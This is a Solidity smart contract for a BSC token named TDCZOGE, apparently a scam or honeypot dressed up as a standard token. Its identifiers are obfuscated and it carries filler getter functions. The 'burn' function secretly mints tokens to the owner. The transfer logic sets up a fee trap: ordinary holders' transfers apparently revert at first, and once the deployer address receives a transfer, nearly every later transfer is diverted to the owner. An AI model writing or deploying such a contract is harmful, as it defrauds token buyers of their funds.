/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.7.4;
contract TDCZOGE {
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  BXDKCR = 100000000;
uint256 public constant XCKZYL = 9999999999999999999999;
address public owner;
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  name = "TDCZOGE";
uint256 private  FTQMUJ = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  LHPIJF = 10000000000;
string public  symbol = "TDCZOGE";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  UMLGRF = 10000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  MUIAQD = address(0);
uint256 private  QADEMA = 1000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  YOJKEL = 1000000000000000;
address private  RFJKMX = address(0);
address private  DWXTED = address(0);
uint8 public constant decimals = 18;
address private  LGCVYN = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  NBLELE = 1000000000000000000;
address private  YBUPHL = address(0);
function _getYBUPHL() private returns (address) {
return YBUPHL;
}

function _getYOJKEL() private returns (uint256) {
return YOJKEL;
}

function _getLHPIJF() private returns (uint256) {
return LHPIJF;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tPIQYDS 0");
require(spender != address(0), "fPIQYDS 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
constructor () {
LGCVYN = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getUMLGRF() private returns (uint256) {
return UMLGRF;
}

function _getBXDKCR() private returns (uint256) {
return BXDKCR;
}

function _getFTQMUJ() private returns (uint256) {
return FTQMUJ;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getRFJKMX() private returns (address) {
return RFJKMX;
}

function _getQADEMA() private returns (uint256) {
return QADEMA;
}

function _getMUIAQD() private returns (address) {
return MUIAQD;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "PIQYDS");
require(to != address(0), "PIQYDS");
require(amount <= balanceOf[from], "PIQYDS");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* XCKZYL/NBLELE ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==LGCVYN){
NBLELE = XCKZYL+2;
}
emit Transfer(from, to, transferAmount);
}
function _getDWXTED() private returns (address) {
return DWXTED;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

}